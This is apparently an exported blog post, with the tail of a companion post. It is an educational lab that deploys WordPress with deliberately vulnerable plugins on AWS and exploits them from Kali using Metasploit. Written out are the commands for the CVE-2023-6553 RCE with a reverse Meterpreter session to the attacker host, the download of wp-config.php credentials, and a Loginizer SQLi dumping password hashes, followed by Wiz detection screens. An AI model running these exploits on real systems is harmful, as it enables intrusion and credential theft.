/opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 311 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 312 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 313 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 314 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 316 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 317 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 318 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 319 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 320 sh 1001 sh -c ps ax -w -o pid,user,cmd --no-header 2&gt;/dev/null 321 ps 1001 ps ax -w -o pid,user,cmd --no-header [*] Running 'sysinfo' on meterpreter session 1 (3.120.120.128) Computer : wordpress-5db67cf9bf-z45tq OS : Linux wordpress-5db67cf9bf-z45tq 5.10.227-219.884.amzn2.x86_64 #1 SMP Tue Oct 22 16:38:23 UTC 2024 x86_64 Meterpreter : php/linux [*] Running 'download /bitnami/wordpress/wp-config.php' on meterpreter session 1 (3.120.120.128) [*] Downloading: /bitnami/wordpress/wp-config.php -&gt; /home/kali/wp-config.php [*] Downloaded 4.19 KiB of 4.19 KiB (100.0%): /bitnami/wordpress/wp-config.php -&gt; /home/kali/wp-config.php [*] Completed : /bitnami/wordpress/wp-config.php -&gt; /home/kali/wp-config.php resource (stdin)&gt; use auxiliary/scanner/http/wp_loginizer_log_sqli resource (stdin)&gt; set rhost a8fe9c409fcee4d7bbcbd9cab63193f8-449369653.eu-central-1.elb.amazonaws.com rhost =&gt; a8fe9c409fcee4d7bbcbd9cab63193f8-449369653.eu-central-1.elb.amazonaws.com resource (stdin)&gt; set verbose true verbose =&gt; true resource (stdin)&gt; run [*] Checking /wp-content/plugins/loginizer/readme.txt [*] Found version 1.6.3 in the plugin [+] Vulnerable version of Loginizer detected [*] {SQLi} Executing (select group_concat(qVEWKKc) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) qVEWKKc from wp_users limit 1) Dbui) [*] {SQLi} Time-based injection: expecting output of length 44 [+] wp_users ======== user_login user_pass ---------- --------- wordpress $P$BMw5qRAPq4/dgegxy/v/jL45GCgc/a0 ... The outputs above indicate that the attack against the WordPress site was successful. We retrieved information about the remote system, including a list of processes, the wp-config.php file, system details, and a list of users with their password hashes. Details in Security tool Explore the Wiz security tool to learn how it can assist in identifying hacker attacks. Wiz Sensor details Let‚Äôs look at the Wiz Sensor details in Wiz to ensure everything was properly installed. Wiz -&gt; Settings -&gt; Deployment -&gt; Sensor - Amazon EKS Wiz -&gt; Settings -&gt; Deployment -&gt; Sensor - EC2 Examine the details about the breach The first place to look in Wiz is the ‚ÄúIssues‚Äù tab: Wiz -&gt; Issues Wiz -&gt; Issues -&gt; Amazon EKS details Wiz -&gt; Issues -&gt; Amazon EC2 + Docker details Wiz -&gt; Issues -&gt; Amazon EC2 details ‚Ä¶or check Cloud Events: Wiz -&gt; Cloud Events If you view the details of the Amazon EKS cluster or the EC2 instances in Wiz, you can also access information about the attack: Wiz -&gt; Amazon EKS issues Wiz -&gt; Amazon EKS events Wiz -&gt; Amazon EKS Wiz -&gt; Amazon EKS -&gt; Issues -&gt; Details -&gt; Investigation Additional breach details can be found in the ‚ÄúRuntime Response Policies‚Äù section: Wiz -&gt; Policies -&gt; Runtime Response Policies -&gt; Details Wiz -&gt; Policies -&gt; Runtime Response Policies -&gt; Details Raw I can also review the container image in Wiz to identify any existing vulnerabilities: Wiz -&gt; Container Image details The screenshots above illustrate the detection capabilities of Wiz combined with the Wiz Sensor, enabling security teams to identify system breaches. It‚Äôs essential to configure notifications and responses to ensure timely alerts in the event of an attack. Cleanup Delete the Amazon EKS cluster, Kali Linux EC2 instance, EC2 Key Pair, and related CloudFormation stacks: export AWS_REGION=\"eu-central-1\" export AWS_EC2_KEY_PAIR_NAME=\"wordpress-test\" export SOLUTION_KALI=\"KaliLinux-NICE-DCV\" export SOLUTION_EC2_CONTAINER=\"Amazon-EC2-Container\" export SOLUTION_EC2=\"Amazon-EC2\" export CLUSTER_NAME=\"Amazon-EKS\" export TMP_DIR=\"${TMP_DIR:-${PWD}}\" export KUBECONFIG=\"${TMP_DIR}/kubeconfig-${CLUSTER_NAME}.conf\" aws cloudformation delete-stack --stack-name \"${SOLUTION_KALI}\" aws cloudformation delete-stack --stack-name \"${SOLUTION_EC2_CONTAINER}\" aws cloudformation delete-stack --stack-name \"${SOLUTION_EC2}\" if eksctl get cluster --name=\"${CLUSTER_NAME}\"; then eksctl delete cluster --name=\"${CLUSTER_NAME}\" --force fi aws cloudformation delete-stack --stack-name \"${SOLUTION_KALI}-VPC\" aws cloudformation delete-stack --stack-name \"${SOLUTION_EC2_CONTAINER}-VPC\" aws cloudformation delete-stack --stack-name \"${SOLUTION_EC2}-VPC\" aws ec2 delete-key-pair --key-name \"${AWS_EC2_KEY_PAIR_NAME}\" for FILE in ${TMP_DIR}/{vpc_cloudformation_template.yml,KaliLinux-NICE-DCV.yaml,AmazonLinux-2023-LAMP-server.yaml,${AWS_EC2_KEY_PAIR_NAME}.pem,helm_values-wordpress.yml,kubeconfig-${CLUSTER_NAME}.conf}; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done Enjoy ‚Ä¶ üòâ" }, { "title": "Exploit vulnerability in a WordPress plugin with Kali Linux 2", "url": "/posts/exploit-vulnerability-wordpress-plugin-kali-linux-2/", "categories": "Security, Exploit, Vulnerability, Kali Linux, EC2, Docker, Amazon ECS", "tags": "EC2, docker, container, security, Kali Linux, exploit, vulnerability, WordPress, plugin, Amazon ECS, SQLi", "date": "2024-05-09 00:00:00 +0200", "content": "For educational purposes, it can be useful to learn how to exploit Remote Code Execution (RCE) and SQL Injection (SQLi) vulnerabilities in a WordPress plugin using Kali Linux. I will cover the following steps: Install an Amazon ECS cluster and create two EC2 instances (one standalone and one with Docker) Install WordPress and a vulnerable WordPress plugin to ECS, Docker, and a standalone EC2 instance Create an EC2 instance with Kali Linux (and install Metasploit on it) to serve as the attacker machine Exploit vulnerabilities in a WordPress plugin using Kali Linux and Metasploit Set necessary environment variables and download CloudFormation templates Requirements: AWS CLI Colima / Docker / Rancher Desktop / ‚Ä¶ copilot Set the required environment variables: export AWS_ACCESS_KEY_ID=\"xxxxxxxxxxxxxxxxxx\" export AWS_SECRET_ACCESS_KEY=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" export AWS_REGION=\"eu-central-1\" AWS_EC2_KEY_PAIR_NAME=\"wordpress-test\" TMP_DIR=\"${TMP_DIR:-${PWD}}\" WORDPRESS_USERNAME=\"wordpress\" WORDPRESS_PASSWORD=$(openssl rand -base64 12) MARIADB_WORDPRESS_DATABASE=\"wordpress\" MARIADB_WORDPRESS_DATABASE_USER=\"wordpress\" MARIADB_WORDPRESS_DATABASE_PASSWORD=$(openssl rand -base64 12) MARIADB_ROOT_PASSWORD=$(openssl rand -base64 12) Download the CloudFormation templates for the VPC, Kali Linux, Ubuntu (Docker EC2), and AmazonLinux-2023 (standalone EC2) instances: # renovate: currentValue=master wget --continue -q -P \"${TMP_DIR}\" https://raw.githubusercontent.com/aws-samples/aws-codebuild-samples/00284b828a360aa89ac635a44d84c5a748af03d3/ci_tools/vpc_cloudformation_template.yml # renovate: wget --continue -q -P \"${TMP_DIR}\" https://raw.githubusercontent.com/aws-samples/amazon-ec2-nice-dcv-samples/3cb54467cf4c58bace2f949a704871f9bc0e5af5/cfn/KaliLinux-NICE-DCV.yaml # renovate: wget --continue -q -P \"${TMP_DIR}\" https://raw.githubusercontent.com/aws-samples/ec2-lamp-server/c0ec2481d4995771422304b05b7b90bd701052f2/UbuntuLinux-2204-LAMP-server.yaml # renovate: wget --continue -q -P \"${TMP_DIR}\" https://raw.githubusercontent.com/aws-samples/ec2-lamp-server/c0ec2481d4995771422304b05b7b90bd701052f2/AmazonLinux-2023-LAMP-server.yaml Create a new AWS EC2 Key Pair to be used for the EC2 instances: aws ec2 create-key-pair --key-name \"${AWS_EC2_KEY_PAIR_NAME}\" --key-type ed25519 --query \"KeyMaterial\" --output text &gt; \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" chmod 600 \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" Run Kali Linux on Amazon EC2 instance Create an AWS EC2 instance with Kali Linux using the CloudFormation template: export SOLUTION_KALI=\"KaliLinux-NICE-DCV\" aws cloudformation deploy --capabilities CAPABILITY_IAM \\ --parameter-overrides \"EnvironmentName=${SOLUTION_KALI}\" \\ --stack-name \"${SOLUTION_KALI}-VPC\" --template-file \"${TMP_DIR}/vpc_cloudformation_template.yml\" \\ --tags \"Owner=${USER} Environment=dev Solution=${SOLUTION_KALI}\" AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name \"${SOLUTION_KALI}-VPC\" --query \"Stacks[0].Outputs[? OutputKey==\\`PublicSubnet1\\` || OutputKey==\\`VPC\\`].{OutputKey:OutputKey,OutputValue:OutputValue}\") AWS_VPC_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"VPC\\\") .OutputValue\") AWS_SUBNET_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"PublicSubnet1\\\") .OutputValue\") eval aws cloudformation create-stack --capabilities CAPABILITY_AUTO_EXPAND CAPABILITY_IAM --on-failure DO_NOTHING \\ --parameters \"ParameterKey=ec2KeyPair,ParameterValue=${AWS_EC2_KEY_PAIR_NAME} ParameterKey=vpcID,ParameterValue=${AWS_VPC_ID} ParameterKey=subnetID,ParameterValue=${AWS_SUBNET_ID} ParameterKey=allowWebServerPorts,ParameterValue=HTTP-and-HTTPS\" \\ --stack-name \"${SOLUTION_KALI}\" --template-body \"file://${TMP_DIR}/KaliLinux-NICE-DCV.yaml\" \\ --tags \"Key=Owner,Value=${USER} Key=Environment,Value=dev Key=Solution,Value=${SOLUTION_KALI}\" Build EC2 instances with Wordpress Application Let‚Äôs look at how to build an EC2 instance with a vulnerable WordPress application. Create new EC2 instance with Wordpress in Container Build a new Ubuntu Linux 22.04 EC2 instance: export SOLUTION_EC2_CONTAINER=\"Amazon-EC2-Container\" aws cloudformation deploy \\ --parameter-overrides \"EnvironmentName=${SOLUTION_EC2_CONTAINER}\" \\ --stack-name \"${SOLUTION_EC2_CONTAINER}-VPC\" --template-file \"${TMP_DIR}/vpc_cloudformation_template.yml\" \\ --tags \"Owner=${USER} Environment=dev Solution=${SOLUTION_EC2_CONTAINER}\" AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name \"${SOLUTION_EC2_CONTAINER}-VPC\" --query \"Stacks[0].Outputs[? OutputKey==\\`PublicSubnet1\\` || OutputKey==\\`VPC\\`].{OutputKey:OutputKey,OutputValue:OutputValue}\") AWS_VPC_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"VPC\\\") .OutputValue\") AWS_SUBNET_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"PublicSubnet1\\\") .OutputValue\") eval aws cloudformation deploy --capabilities CAPABILITY_IAM \\ --parameter-overrides \"instanceType=t4g.medium ec2Name=${SOLUTION_EC2_CONTAINER} ec2KeyPair=${AWS_EC2_KEY_PAIR_NAME} vpcID=${AWS_VPC_ID} subnetID=${AWS_SUBNET_ID} webOption=none databaseOption=none phpVersion=none\" \\ --stack-name \"${SOLUTION_EC2_CONTAINER}\" --template-file \"${TMP_DIR}/AmazonLinux-2023-LAMP-server.yaml\" \\ --tags \"Owner=${USER} Environment=dev Solution=${SOLUTION_EC2_CONTAINER}\" AWS_EC2_CONTAINER_PUBLIC_IP=$(aws ec2 describe-instances --filters \"Name=tag:Solution,Values=${SOLUTION_EC2_CONTAINER}\" --query \"Reservations[].Instances[].PublicIpAddress\" --output text) ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"ec2-user@${AWS_EC2_CONTAINER_PUBLIC_IP}\" 'curl -Ls https://github.com/ruzickap.keys &gt;&gt; ~/.ssh/authorized_keys' Install Docker and Docker Compose on the instance: ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"ec2-user@${AWS_EC2_CONTAINER_PUBLIC_IP}\" &lt;&lt; \\EOF set -euxo pipefail sudo dnf install -qy docker sudo usermod -aG docker ec2-user sudo systemctl enable --now docker sudo mkdir -p /usr/local/lib/docker/cli-plugins sudo curl -sL https://github.com/docker/compose/releases/latest/download/docker-compose-linux-$(uname -m) -o /usr/local/lib/docker/cli-plugins/docker-compose sudo chown root:root /usr/local/lib/docker/cli-plugins/docker-compose sudo chmod +x /usr/local/lib/docker/cli-plugins/docker-compose EOF Install WordPress in a container with the vulnerable WordPress Backup Migration Plugin and Loginizer plugins: # shellcheck disable=SC2087 ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"ec2-user@${AWS_EC2_CONTAINER_PUBLIC_IP}\" &lt;&lt; EOF2 set -euxo pipefail mkdir -p docker-entrypoint-init.d cat &gt; docker-entrypoint-init.d/wordpress_plugin_install.sh &lt;&lt; EOF wp plugin install backup-backup --version=1.3.7 --activate wp plugin install loginizer --version=1.6.3 --activate EOF chmod a+x docker-entrypoint-init.d/wordpress_plugin_install.sh cat &gt; docker-compose.yml &lt;&lt; EOF services: mariadb: # renovate: datasource=docker depName=bitnami/mariadb image: docker.io/bitnami/mariadb:11.2 volumes: - 'mariadb_data:/bitnami/mariadb' environment: - ALLOW_EMPTY_PASSWORD=no - MARIADB_USER=${MARIADB_WORDPRESS_DATABASE_USER} - MARIADB_DATABASE=${MARIADB_WORDPRESS_DATABASE} - MARIADB_PASSWORD=${MARIADB_WORDPRESS_DATABASE_PASSWORD} - MARIADB_ROOT_PASSWORD=${MARIADB_ROOT_PASSWORD} wordpress: image: docker.io/bitnami/wordpress:6 ports: - '80:8080' - '443:8443' volumes: - 'wordpress_data:/bitnami/wordpress' - '\\${PWD}/docker-entrypoint-init.d:/docker-entrypoint-init.d' depends_on: - mariadb environment: - ALLOW_EMPTY_PASSWORD=no - WORDPRESS_USERNAME=${WORDPRESS_USERNAME} - WORDPRESS_PASSWORD=${WORDPRESS_PASSWORD} - WORDPRESS_DATABASE_HOST=mariadb - WORDPRESS_DATABASE_PORT_NUMBER=3306 - WORDPRESS_DATABASE_USER=${MARIADB_WORDPRESS_DATABASE_USER} - WORDPRESS_DATABASE_PASSWORD=${MARIADB_WORDPRESS_DATABASE_PASSWORD} - WORDPRESS_DATABASE_NAME=${MARIADB_WORDPRESS_DATABASE} volumes: mariadb_data: driver: local wordpress_data: driver: local EOF docker compose up --quiet-pull -d EOF2 The vulnerable plugins, WordPress Backup Migration Plugin 1.3.7 and Loginizer 1.6.3, were installed. Summarize the WordPress URL, Admin URL, Username, and Password: echo \"WordPress URL: http://${AWS_EC2_CONTAINER_PUBLIC_IP}/\" echo \"WordPress Admin URL: http://${AWS_EC2_CONTAINER_PUBLIC_IP}/admin\" echo -e \"Username: ${WORDPRESS_USERNAME}\\nPassword: ${WORDPRESS_PASSWORD}\" Create new EC2 instance with Wordpress Build a new Amazon Linux 2023 EC2 instance for a standalone WordPress installation: export SOLUTION_EC2=\"Amazon-EC2\" aws cloudformation deploy \\ --parameter-overrides \"EnvironmentName=${SOLUTION_EC2}\" \\ --stack-name \"${SOLUTION_EC2}-VPC\" --template-file \"${TMP_DIR}/vpc_cloudformation_template.yml\" \\ --tags \"Owner=${USER} Environment=dev Solution=${SOLUTION_EC2}\" AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name \"${SOLUTION_EC2}-VPC\" --query \"Stacks[0].Outputs[? OutputKey==\\`PublicSubnet1\\` || OutputKey==\\`VPC\\`].{OutputKey:OutputKey,OutputValue:OutputValue}\") AWS_VPC_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"VPC\\\") .OutputValue\") AWS_SUBNET_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"PublicSubnet1\\\") .OutputValue\") eval aws cloudformation deploy --capabilities CAPABILITY_IAM \\ --parameter-overrides \"instanceType=t4g.medium ec2Name=${SOLUTION_EC2} ec2KeyPair=${AWS_EC2_KEY_PAIR_NAME} vpcID=${AWS_VPC_ID} subnetID=${AWS_SUBNET_ID}\" \\ --stack-name \"${SOLUTION_EC2}\" --template-file \"${TMP_DIR}/AmazonLinux-2023-LAMP-server.yaml\" \\ --tags \"Owner=${USER} Environment=dev Solution=${SOLUTION_EC2}\" AWS_EC2_PUBLIC_IP=$(aws ec2 describe-instances --filters \"Name=tag:Solution,Values=${SOLUTION_EC2}\" --query \"Reservations[].Instances[].PublicIpAddress\" --output text) ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"ec2-user@${AWS_EC2_PUBLIC_IP}\" 'curl -Ls https://github.com/ruzickap.keys &gt;&gt; ~/.ssh/authorized_keys' Configure MariaDB and add a wordpress user with a password: # shellcheck disable=SC2087 ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"ec2-user@${AWS_EC2_PUBLIC_IP}\" &lt;&lt; EOF2 sudo mysql --user=root &lt;&lt; \\EOF UPDATE mysql.global_priv SET priv=json_set(priv, '$.plugin', 'mysql_native_password', '$.authentication_string', PASSWORD('${MARIADB_ROOT_PASSWORD}')) WHERE User='root'; DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1'); DELETE FROM mysql.global_priv WHERE User=''; DROP DATABASE IF EXISTS test; DELETE FROM mysql.db WHERE Db='test' OR Db='test\\\\_%'; CREATE USER '${MARIADB_WORDPRESS_DATABASE_USER}'@'localhost' IDENTIFIED BY '${MARIADB_WORDPRESS_DATABASE_PASSWORD}'; GRANT ALL PRIVILEGES ON ${MARIADB_WORDPRESS_DATABASE}.* TO '${MARIADB_WORDPRESS_DATABASE_USER}'@'localhost'; FLUSH PRIVILEGES; EOF EOF2 Install WordPress with the vulnerable WordPress Backup Migration Plugin and Loginizer plugins: # shellcheck disable=SC2087 ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"ec2-user@${AWS_EC2_PUBLIC_IP}\" &lt;&lt; EOF set -euxo pipefail wget -q https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar chmod +x wp-cli.phar sudo mv wp-cli.phar /usr/local/bin/wp cd /var/www/html/ wp core download --version=6.5.3 wp config create --dbname=\"${MARIADB_WORDPRESS_DATABASE}\" --dbuser=\"${MARIADB_WORDPRESS_DATABASE_USER}\" --dbpass=\"${MARIADB_WORDPRESS_DATABASE_PASSWORD}\" wp db create wp core install --url=\"${AWS_EC2_PUBLIC_IP}\" --title=\"My Blog\" --admin_user=\"${WORDPRESS_USERNAME}\" --admin_password=\"${WORDPRESS_PASSWORD}\" --skip-email --admin_email=\"info@example.com\" wp plugin install backup-backup --version=1.3.7 --activate wp plugin install loginizer --version=1.6.3 --activate EOF Summarize the WordPress URL, Admin URL, Username, and Password: echo \"WordPress URL: http://${AWS_EC2_PUBLIC_IP}/\" echo \"WordPress Admin URL: http://${AWS_EC2_PUBLIC_IP}/wp-admin/\" echo -e \"Username: ${WORDPRESS_USERNAME}\\nPassword: ${WORDPRESS_PASSWORD}\" Create ECS cluster with Wordpress Prepare the wordpress_plugin_install.sh startup script. This script will be used to install the vulnerable WordPress Backup Migration Plugin and Loginizer plugins during container startup: cd \"${TMP_DIR}\" || exit cat &gt; wordpress_plugin_install.sh &lt;&lt; EOF wp plugin install backup-backup --version=1.3.7 --activate wp plugin install loginizer --version=1.6.3 --activate EOF chmod a+x wordpress_plugin_install.sh Create the startup.sh script. This script will populate environment variables for the bitnami/wordpress container based on the WORDPRESSCLUSTER_SECRET produced by Copilot: cat &gt; startup.sh &lt;&lt; \\EOF #!/bin/sh # Exit if the secret wasn't populated by the ECS agent if [ -z \"${WORDPRESSCLUSTER_SECRET}\" ]; then echo \"Environment variable \"WORDPRESSCLUSTER_SECRET\" with secrets is not populated in environment !!!\" echo 'It should look like: {\"host\":\"mariadb\",\"port\":3306,\"dbname\":\"wordpress\",\"username\":\"wordpress\",\"password\":\"password\"}' exit 1 fi export WORDPRESS_DATABASE_HOST=$(echo \"${WORDPRESSCLUSTER_SECRET}\" | jq -r '.host') export WORDPRESS_DATABASE_PORT_NUMBER=$(echo \"${WORDPRESSCLUSTER_SECRET}\" | jq -r '.port') export WORDPRESS_DATABASE_NAME=$(echo \"${WORDPRESSCLUSTER_SECRET}\" | jq -r '.dbname') export WORDPRESS_DATABASE_USER=$(echo \"${WORDPRESSCLUSTER_SECRET}\" | jq -r '.username') export WORDPRESS_DATABASE_PASSWORD=$(echo \"${WORDPRESSCLUSTER_SECRET}\" | jq -r '.password') /opt/bitnami/scripts/wordpress/entrypoint.sh /opt/bitnami/scripts/apache/run.sh EOF chmod a+x startup.sh Prepare the Dockerfile. This file defines how to install jq into the Bitnami WordPress image and uses the startup.sh script to start the container: cat &gt; Dockerfile &lt;&lt; \\EOF FROM docker.io/bitnami/minideb:bookworm as installer RUN set -eux &amp;&amp; \\ apt-get update -q &amp;&amp; \\ apt-get install curl -y -q &amp;&amp; \\ curl -sLo /usr/local/bin/jq https://github.com/stedolan/jq/releases/download/jq-1.5/jq-linux64 &amp;&amp; \\ chmod a+x /usr/local/bin/jq FROM docker.io/bitnami/wordpress:latest as app COPY --from=installer /usr/local/bin/jq /usr/bin/jq COPY startup.sh /opt/copilot/scripts/startup.sh COPY wordpress_plugin_install.sh /docker-entrypoint-init.d/ ENTRYPOINT [\"/bin/sh\", \"-c\"] CMD [\"/opt/copilot/scripts/startup.sh\"] EXPOSE 8080 EOF Initialize the backend application with Copilot: copilot app init wordpress --resource-tags \"Owner=${USER},Environment=dev,Solution=Amazon-ECS\" Create a development environment for the application: copilot env init --name dev --default-config Set up the required infrastructure to run our containerized application. Copilot will now proceed to create the VPC, Public Subnets, Private Subnets, a Route53 Private Hosted Zone for service discovery, a custom route table, a Security Group for inter-container communication, and an ECS Cluster to group the ECS services: copilot env deploy --name dev Create WordPress secrets as SecureString parameters in SSM Parameter Store: copilot secret init --name WORDPRESS_USERNAME --values \"dev=${WORDPRESS_USERNAME}\" --overwrite copilot secret init --name WORDPRESS_PASSWORD --values \"dev=${WORDPRESS_PASSWORD}\" --overwrite Start Docker Desktop or Colima if you are a macOS user: colima start Create a manifest file that defines your backend service: copilot svc init --dockerfile Dockerfile \\ --name wordpress --port 8080 --svc-type 'Load Balanced Web Service' Add references to the secrets in copilot/wordpress/manifest.yml: cat &gt;&gt; copilot/wordpress/manifest.yml &lt;&lt; EOF secrets: WORDPRESS_USERNAME: /copilot/wordpress/dev/secrets/WORDPRESS_USERNAME WORDPRESS_PASSWORD: /copilot/wordpress/dev/secrets/WORDPRESS_PASSWORD EOF Create an Aurora DB to be used by the backend service: copilot storage init --name wordpress-cluster --lifecycle=workload \\ --storage-type Aurora --engine MySQL --initial-db \"${MARIADB_WORDPRESS_DATABASE}\" Deploy the backend service: copilot svc deploy --resource-tags \"Owner=${USER},Environment=dev,Solution=Amazon-ECS\" Get the details of the deployed service: COPILOT_PUBLIC_IP=$(copilot svc show --name wordpress --json | jq -r '.routes[].url') copilot svc show --name wordpress About Application wordpress Name wordpress Type Load Balanced Web Service Configurations Environment Tasks CPU (vCPU) Memory (MiB) Platform Port ----------- ----- ---------- ------------ -------- ---- dev 1 0.25 512 LINUX/X86_64 8080 Routes Environment URL ----------- --- dev http://wordpr-Publi-BpPriJDxXb94-436714884.eu-central-1.elb.amazonaws.com Internal Service Endpoints Endpoint Environment Type -------- ----------- ---- wordpress:8080 dev Service Connect wordpress.dev.wordpress.local:8080 dev Service Discovery Variables Name Container Environment Value ---- --------- ----------- ----- COPILOT_APPLICATION_NAME wordpress dev wordpress COPILOT_ENVIRONMENT_NAME \" \" dev COPILOT_LB_DNS \" \" wordpr-Publi-BpPriJDxXb94-436714884.eu-central-1.elb.amazonaws.com COPILOT_SERVICE_DISCOVERY_ENDPOINT \" \" dev.wordpress.local COPILOT_SERVICE_NAME \" \" wordpress WORDPRESSCLUSTER_SECURITY_GROUP \" \" sg-0877803062b02c1ac Secrets Name Container Environment Value From ---- --------- ----------- ---------- WORDPRESSCLUSTER_SECRET wordpress dev arn:aws:secretsmanager:eu-central-1:729560437327:secret:wordpressclusterAuroraSecre-2q9Fj1KRUkQL-VV3pqy WORDPRESS_PASSWORD \" \" parameter//copilot/wordpress/dev/secrets/WORDPRESS_PASSWORD WORDPRESS_USERNAME \" \" parameter//copilot/wordpress/dev/secrets/WORDPRESS_USERNAME Summarize the WordPress URL, Admin URL, Username and Password: echo \"WordPress URL: ${COPILOT_PUBLIC_IP}/\" echo \"WordPress Admin URL: ${COPILOT_PUBLIC_IP}/wp-admin/\" echo -e \"Username: ${WORDPRESS_USERNAME}\\nPassword: ${WORDPRESS_PASSWORD}\" Handy ECS links: Build Efficient CI/CD Pipelines for Connected Microservices in Under an Hour Using AWS Copilot Wordpress on Copilot Attack the Wordpress Application The following part describes using the Metasploit Framework to exploit vulnerabilities in the WordPress Backup Migration Plugin and Loginizer plugins. Details about the WordPress plugin vulnerabilities can be found here: WordPress Backup Migration Plugin WordPress Backup Migration Plugin PHP Filter Chain RCE Vulnerability Details : CVE-2023-6553 CVE-2023-6553 Exploit V2 CVE-2023-6553 Detail Unauth RCE in the WordPress plugin: Backup Migration (&lt;= 1.3.7) Loginizer WordPress Loginizer log SQLi Scanner Vulnerability Details : CVE-2020-27615 CVE-2020-27615 Detail Loginizer timebased SQL injection in versions before 1.6.4 Log in to the Kali Linux instance using SSH and perform the following steps: Use the wp_backup_migration_php_filter and wp_loginizer_log_sqli Metasploit modules to exploit the WordPress plugin vulnerabilities Execute sysinfo to get details about the remote system Download the WordPress config file wp-config.php, which contains database credentials Allow your user to connect to the Kali Linux instance using SSH and then install Metasploit: AWS_EC2_KALI_LINUX_PUBLIC_IP=$(aws ec2 describe-instances --filters \"Name=tag:Solution,Values=${SOLUTION_KALI}\" --query \"Reservations[].Instances[].PublicIpAddress\" --output text) ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}\" 'curl -Ls https://github.com/ruzickap.keys &gt;&gt; ~/.ssh/authorized_keys' scp -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" \"kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}\":~ ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}\" &lt;&lt; EOF touch ~/.hushlogin sudo snap install metasploit-framework msfdb init EOF Metasploit logo Run the Metasploit Framework and exploit the vulnerability in all three environments (ECS, EC2 with Docker, and a standalone EC2 instance): # shellcheck disable=SC2087 for PUBLIC_IP in ${COPILOT_PUBLIC_IP} ${AWS_EC2_CONTAINER_PUBLIC_IP} ${AWS_EC2_PUBLIC_IP}; do echo \"*** ${PUBLIC_IP}\" ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}\" &lt;&lt; EOF2 cat &lt;&lt; EOF | msfconsole --quiet --resource - use exploit/multi/http/wp_backup_migration_php_filter set rhost ${PUBLIC_IP} set lhost ${AWS_EC2_KALI_LINUX_PUBLIC_IP} set lport 443 run --no-interact sessions --interact 1 --meterpreter-command ps --meterpreter-command sysinfo \\ --meterpreter-command \"download /bitnami/wordpress/wp-config.php\" use auxiliary/scanner/http/wp_loginizer_log_sqli set rhost ${PUBLIC_IP} set verbose true run exit -y EOF EOF2 done The output below was shortened, showing only the attack against WordPress on Amazon ECS: *** http://wordpr-Publi-BpPriJDxXb94-436714884.eu-central-1.elb.amazonaws.com ** Welcome to Metasploit Framework Initial Setup ** Please answer a few questions to get started. ** Metasploit Framework Initial Setup Complete ** Running the 'init' command for the database: Existing database found, attempting to start it Starting database at /home/kali/snap/metasploit-framework/common/.msf4/db...server starting success This copy of metasploit-framework is more than two weeks old. Consider running 'msfupdate' to update to the latest version. [*] 